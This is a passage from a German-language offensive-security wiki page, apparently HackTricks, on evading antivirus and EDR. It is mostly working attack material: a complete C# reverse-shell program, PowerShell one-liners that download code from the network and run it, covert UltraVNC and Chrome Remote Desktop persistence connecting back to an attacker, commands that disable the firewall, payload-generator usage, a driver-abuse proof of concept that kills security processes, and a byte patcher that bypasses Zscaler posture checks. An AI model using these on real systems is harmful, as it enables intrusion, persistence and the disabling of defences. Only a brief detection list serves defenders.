Durch den Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share können Sie **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine **ausführen**.

Das Repo weist darauf hin: Defender scannt weiterhin die Skripte, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token Stomping ist eine Technik, die es einem Angreifer ermöglicht, das Zugriffstoken oder ein Sicherheitsprodukt wie ein EDR oder AV zu **manipulieren**, wodurch die Berechtigungen reduziert werden, sodass der Prozess nicht abstürzt, aber keine Berechtigungen hat, um nach böswilligen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **externe Prozesse** daran hindern, Handles über die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Verwendung vertrauenswürdiger Software

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC des Opfers zu installieren und es dann zu verwenden, um die Kontrolle zu übernehmen und Persistenz aufrechtzuerhalten:
1. Laden Sie von https://remotedesktop.google.com/ herunter, klicken Sie auf "Über SSH einrichten" und dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führen Sie den Installer im Hintergrund auf dem Opfer aus (Admin erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehen Sie zurück zur Chrome Remote Desktop-Seite und klicken Sie auf Weiter. Der Assistent wird Sie dann auffordern, sich zu autorisieren; klicken Sie auf die Schaltfläche Autorisieren, um fortzufahren.
4. Führen Sie den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachten Sie den Pin-Parameter, der es ermöglicht, die PIN ohne Verwendung der GUI festzulegen).

## Fortgeschrittene Umgehung

Umgehung ist ein sehr kompliziertes Thema, manchmal müssen Sie viele verschiedene Telemetriequellen in nur einem System berücksichtigen, sodass es ziemlich unmöglich ist, in reifen Umgebungen völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie vorgehen, hat ihre eigenen Stärken und Schwächen.

Ich empfehle Ihnen dringend, sich diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einblick in fortgeschrittene Umgehungstechniken zu erhalten.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Umgehung in der Tiefe.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Überprüfen, welche Teile Defender als böswillig erkennt**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binärdatei entfernt**, bis es **herausfindet, welcher Teil von Defender** als böswillig erkannt wird und es Ihnen aufteilt.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Webangebot, das den Dienst in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) anbietet.

### **Telnet-Server**

Bis Windows 10 kam jeder Windows mit einem **Telnet-Server**, den Sie (als Administrator) installieren konnten, indem Sie:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lassen Sie es **starten**, wenn das System gestartet wird, und **führen** Sie es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändern Sie den Telnet-Port** (stealth) und deaktivieren Sie die Firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laden Sie es herunter von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (Sie möchten die Binärdownloads, nicht das Setup)

**AUF DEM HOST**: Führen Sie _**winvnc.exe**_ aus und konfigurieren Sie den Server:

- Aktivieren Sie die Option _Disable TrayIcon_
- Setzen Sie ein Passwort in _VNC Password_
- Setzen Sie ein Passwort in _View-Only Password_

Verschieben Sie dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ in die **Opfer**

#### **Reverse-Verbindung**

Der **Angreifer** sollte **innerhalb** seines **Hosts** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit sie **vorbereitet** ist, eine umgekehrte **VNC-Verbindung** zu empfangen. Dann, innerhalb des **Opfers**: Starten Sie den winvnc-Daemon `winvnc.exe -run` und führen Sie `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um die Tarnung zu wahren, dürfen Sie einige Dinge nicht tun

- Starten Sie `winvnc` nicht, wenn es bereits läuft, oder Sie lösen ein [Popup](https://i.imgur.com/1SROTTl.png) aus. Überprüfen Sie, ob es läuft mit `tasklist | findstr winvnc`
- Starten Sie `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da dies [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) öffnet
- Führen Sie `winvnc -h` nicht zur Hilfe aus, oder Sie lösen ein [Popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Laden Sie es herunter von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt **starten Sie den Lister** mit `msfconsole -r file.rc` und **führen Sie** die **xml Payload** mit aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unser eigenes Reverse Shell kompilieren

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# unter Verwendung des Compilers
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# Obfuskatorenliste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Verwendung von Python für den Bau von Injektoren Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Werkzeuge
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space töten

Storm-2603 nutzte ein kleines Konsolen-Utility namens **Antivirus Terminator**, um Endpunktschutzmaßnahmen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst von Protected-Process-Light (PPL) AV-Diensten nicht blockiert werden können.

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte gelieferte Datei ist `ServiceMouse.sys`, aber die Binärdatei ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch geladen, wenn die Treibersignaturüberprüfung (DSE) aktiviert ist.
2. **Dienstinstallation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Dienst** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Benutzermodus zugänglich wird.
3. **Von dem Treiber exponierte IOCTLs**
| IOCTL-Code | Fähigkeit                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beende einen beliebigen Prozess nach PID (verwendet, um Defender/EDR-Dienste zu beenden) |
| `0x990000D0` | Lösche eine beliebige Datei auf der Festplatte |
| `0x990001D0` | Entlade den Treiber und entferne den Dienst |

Minimaler C Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht vollständig die Benutzermodus-Schutzmaßnahmen; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, sie beenden oder mit Kernel-Objekten unabhängig von PPL/PP, ELAM oder anderen Härtungsfunktionen manipulieren.

Erkennung / Minderung
•  Aktivieren Sie Microsofts Blockliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows `AToolsKrnl64.sys` nicht lädt.
•  Überwachen Sie die Erstellung neuer *Kernel*-Dienste und alarmieren Sie, wenn ein Treiber aus einem weltweit beschreibbaren Verzeichnis geladen wird oder nicht auf der Erlaubenliste steht.
•  Achten Sie auf Handles im Benutzermodus zu benutzerdefinierten Geräteobjekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehung der Zscaler Client Connector-Haltungskontrollen durch On-Disk-Binärpatching

Zscalers **Client Connector** wendet Gerätehaltungsregeln lokal an und verlässt sich auf Windows RPC, um die Ergebnisse an andere Komponenten zu kommunizieren. Zwei schwache Designentscheidungen ermöglichen eine vollständige Umgehung:

1. Die Bewertung der Haltung erfolgt **vollständig clientseitig** (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte validieren nur, dass die verbindende ausführbare Datei **von Zscaler signiert ist** (über `WinVerifyTrust`).

Durch **Patchen von vier signierten Binärdateien auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binärdatei | Originallogik gepatcht | Ergebnis |
|------------|-------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Überprüfung konform ist |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder (auch unsignierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimaler Patcher-Ausschnitt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die ursprünglichen Dateien ersetzt und der Dienst-Stack neu gestartet wurde:

* **Alle** Statusprüfungen zeigen **grün/einhaltung** an.
* Unsigned oder modifizierte Binärdateien können die benannten Pipe RPC-Endpunkte öffnen (z.B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit ein paar Byte-Patches überwunden werden können.

## Referenzen

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
